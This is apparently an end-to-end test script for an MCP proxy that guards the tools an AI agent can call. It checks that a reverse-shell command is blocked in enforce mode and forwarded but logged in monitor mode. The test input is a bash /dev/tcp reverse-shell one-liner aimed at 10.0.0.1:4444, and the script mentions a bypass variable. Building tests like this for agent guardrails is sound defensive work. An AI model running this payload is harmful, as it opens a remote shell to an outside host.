#!/usr/bin/env node
/**
 * scripts/mcp-proxy-e2e.ts — end-to-end verification of the ClaudeSec MCP
 * enforcement proxy.
 *
 * For each mode (enforce, monitor) it:
 *   1. spawns `tsx cli/mcp-proxy.ts -- tsx scripts/mcp-mock-server.ts`
 *      with an isolated enforce-config (this file's tmp config) and a fresh
 *      exec-marker file,
 *   2. drives a real MCP client over the proxy's stdio:
 *        initialize → notifications/initialized → tools/list
 *        → tools/call echo  → tools/call run_command(<reverse-shell>),
 *   3. asserts:
 *        • tools/list shows BOTH echo and run_command (transparency),
 *        • echo is forwarded (downstream ran, result text matches),
 *        • ENFORCE: run_command returns isError:true AND the exec-marker file
 *          NEVER got the run_command token (downstream provably not invoked),
 *        • MONITOR: run_command is forwarded (downstream ran, marker present)
 *          AND a would-block was POSTed to /api/enforce-log on the isolated
 *          dashboard (:3199), surfaced via GET /api/enforce-log.
 *
 * The dangerous arg is assembled from parts here (never on a shell line). It is
 * a /dev/tcp reverse shell, which hits BOTH the catastrophic floor and the
 * high-severity "Bash TCP reverse shell" block rule.
 *
 * Exit 0 = all assertions pass. Exit 1 = a failure.
 */

import { spawn, type ChildProcess } from 'node:child_process';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { fileURLToPath } from 'node:url';

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const REPO_ROOT = path.resolve(__dirname, '..');

// Dashboard port for enforce-log (isolated server is started by the runner).
const PORT = Number(process.env.CLAUDESEC_PORT ?? process.env.PORT ?? 3199);

// Reverse-shell arg, assembled from parts (kept off any shell command line).
const DANGEROUS = ['bash -i >& /dev/tcp/', '10.0.0.1', '/4444 0>&1'].join('');

let failures = 0;
function check(name: string, cond: boolean, extra = ''): void {
  if (cond) {
    console.log(`  ✓ ${name}`);
  } else {
    failures++;
    console.log(`  ✗ ${name}${extra ? ' — ' + extra : ''}`);
  }
}

interface RpcResponse {
  id?: string | number | null;
  result?: any;
  error?: any;
}

/** A tiny MCP-over-stdio client bound to a child proxy process. */
class Client {
  private buf = '';
  private waiters = new Map<string | number, (r: RpcResponse) => void>();

  constructor(private child: ChildProcess) {
    child.stdout!.on('data', (chunk: Buffer) => {
      this.buf += chunk.toString('utf8');
      let nl: number;
      while ((nl = this.buf.indexOf('\n')) !== -1) {
        const line = this.buf.slice(0, nl);
        this.buf = this.buf.slice(nl + 1);
        if (line.trim() === '') continue;
        let msg: RpcResponse;
        try { msg = JSON.parse(line); } catch { continue; }
        if (msg.id !== undefined && msg.id !== null && this.waiters.has(msg.id)) {
          const w = this.waiters.get(msg.id)!;
          this.waiters.delete(msg.id);
          w(msg);
        }
      }
    });
  }

  notify(method: string, params?: unknown): void {
    this.child.stdin!.write(JSON.stringify({ jsonrpc: '2.0', method, params }) + '\n');
  }

  request(id: string | number, method: string, params?: unknown, timeoutMs = 8000): Promise<RpcResponse> {
    return new Promise((resolve, reject) => {
      const timer = setTimeout(() => {
        this.waiters.delete(id);
        reject(new Error(`timeout waiting for response to ${method} (id=${id})`));
      }, timeoutMs);
      this.waiters.set(id, (r) => { clearTimeout(timer); resolve(r); });
      this.child.stdin!.write(JSON.stringify({ jsonrpc: '2.0', id, method, params }) + '\n');
    });
  }
}

function sleep(ms: number): Promise<void> {
  return new Promise((r) => setTimeout(r, ms));
}

async function fetchEnforceLog(): Promise<any[]> {
  try {
    const res = await fetch(`http://127.0.0.1:${PORT}/api/enforce-log?limit=100`);
    const json = (await res.json()) as { events?: any[] };
    return json.events ?? [];
  } catch {
    return [];
  }
}

async function runMode(mode: 'enforce' | 'monitor'): Promise<void> {
  console.log(`\n── mode: ${mode} ──────────────────────────────────────────`);

  // Isolated enforce-config for this run.
  const cfgPath = path.join(os.tmpdir(), `claudesec-e2e-config-${mode}-${process.pid}.json`);
  fs.writeFileSync(cfgPath, JSON.stringify({ mode, overrides: {} }));

  // Fresh exec-marker file (proof of downstream execution).
  const markerFile = path.join(os.tmpdir(), `claudesec-e2e-exec-${mode}-${process.pid}.log`);
  try { fs.unlinkSync(markerFile); } catch { /* ignore */ }
  const MARKER = `EXEC_${mode.toUpperCase()}_${Date.now()}`;

  // Spawn: proxy -> mock server. The proxy reads its config + posts to :PORT.
  const child = spawn(
    'npx',
    ['tsx', 'cli/mcp-proxy.ts', '--', 'npx', 'tsx', 'scripts/mcp-mock-server.ts'],
    {
      cwd: REPO_ROOT,
      stdio: ['pipe', 'pipe', 'inherit'],
      env: {
        ...process.env,
        CLAUDESEC_ENFORCE_CONFIG: cfgPath,
        CLAUDESEC_PORT: String(PORT),
        PORT: String(PORT),
        MOCK_EXEC_FILE: markerFile,
        MOCK_EXEC_MARKER: MARKER,
        // Ensure no stray bypass leaks in.
        CLAUDESEC_HOOKS_BYPASS: '',
      },
    },
  ) as ChildProcess;

  const client = new Client(child);

  try {
    // 1. initialize
    const init = await client.request(1, 'initialize', {
      protocolVersion: '2025-06-18',
      capabilities: {},
      clientInfo: { name: 'e2e-client', version: '0.0.1' },
    });
    check('initialize returns serverInfo', init.result?.serverInfo?.name === 'mcp-mock-server',
      JSON.stringify(init.result));

    // 2. notifications/initialized
    client.notify('notifications/initialized');

    // 3. tools/list — transparency assertion
    const list = await client.request(2, 'tools/list');
    const names: string[] = (list.result?.tools ?? []).map((t: any) => t.name);
    check('tools/list shows echo (transparency)', names.includes('echo'), names.join(','));
    check('tools/list shows run_command (transparency)', names.includes('run_command'), names.join(','));

    // 4. tools/call echo — benign, must be forwarded
    const echo = await client.request(3, 'tools/call', { name: 'echo', arguments: { text: 'hello' } });
    check('echo forwarded (downstream ran)', echo.result?.content?.[0]?.text === 'echo: hello',
      JSON.stringify(echo.result ?? echo.error));
    check('echo not flagged as error', echo.result?.isError !== true);

    // 5. tools/call run_command(<reverse shell>) — the gated case
    const danger = await client.request(4, 'tools/call', {
      name: 'run_command',
      arguments: { command: DANGEROUS },
    });

    // Give the async enforce-log POST a moment to land.
    await sleep(500);
    const markerContents = fs.existsSync(markerFile) ? fs.readFileSync(markerFile, 'utf8') : '';
    const downstreamRan = markerContents.includes('run_command');

    if (mode === 'enforce') {
      check('run_command BLOCKED (isError:true)', danger.result?.isError === true,
        JSON.stringify(danger.result ?? danger.error));
      check('blocked result has explanatory content',
        typeof danger.result?.content?.[0]?.text === 'string' &&
        /blocked/i.test(danger.result.content[0].text));
      check('blocked result mentions bypass note',
        /CLAUDESEC_HOOKS_BYPASS/.test(danger.result?.content?.[0]?.text ?? ''));
      check('downstream run_command NOT invoked (marker absent)', !downstreamRan,
        `marker file = ${JSON.stringify(markerContents)}`);

      // enforce-log should have an enforce would-block for the reverse-shell label.
      const events = await fetchEnforceLog();
      const hit = events.find((e) =>
        e.mode === 'enforce' && e.wouldBlock === true &&
        /reverse shell|TCP reverse/i.test(String(e.label)));
      check('enforce-log has enforce would-block entry on :' + PORT, !!hit,
        `events=${JSON.stringify(events.slice(0, 3))}`);
    } else {
      // monitor: forwarded → downstream ran → result is the real tool output.
      check('run_command FORWARDED in monitor (downstream ran, marker present)', downstreamRan,
        `marker file = ${JSON.stringify(markerContents)}`);
      check('monitor result is downstream output (not a block)',
        danger.result?.isError !== true &&
        /^ran: /.test(danger.result?.content?.[0]?.text ?? ''),
        JSON.stringify(danger.result ?? danger.error));

      const events = await fetchEnforceLog();
      const hit = events.find((e) =>
        e.mode === 'monitor' && e.wouldBlock === true &&
        /reverse shell|TCP reverse/i.test(String(e.label)));
      check('enforce-log has monitor would-block entry on :' + PORT, !!hit,
        `events=${JSON.stringify(events.slice(0, 3))}`);
    }
  } finally {
    try { child.stdin?.end(); } catch { /* ignore */ }
    try { child.kill('SIGTERM'); } catch { /* ignore */ }
    try { fs.unlinkSync(cfgPath); } catch { /* ignore */ }
    try { fs.unlinkSync(markerFile); } catch { /* ignore */ }
    await sleep(200);
  }
}

async function main(): Promise<void> {
  console.log(`MCP enforcement proxy e2e — dashboard port ${PORT}`);
  await runMode('enforce');
  await runMode('monitor');

  console.log('\n──────────────────────────────────────────────────────────');
  if (failures === 0) {
    console.log('ALL ASSERTIONS PASSED ✓');
    process.exit(0);
  } else {
    console.log(`${failures} ASSERTION(S) FAILED ✗`);
    process.exit(1);
  }
}

main().catch((e) => {
  console.error('e2e harness crashed:', e);
  process.exit(1);
});
